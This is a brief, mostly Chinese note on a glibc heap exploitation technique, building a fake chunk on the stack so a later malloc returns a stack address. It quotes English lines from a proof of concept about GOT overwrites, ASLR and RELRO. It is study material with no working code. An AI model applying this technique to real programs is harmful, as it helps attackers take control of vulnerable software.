在栈上构建一个 fake chunk

如果有机会free掉这个假的chunk，那么就可以控制下一次malloc时的地址到栈上。

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum
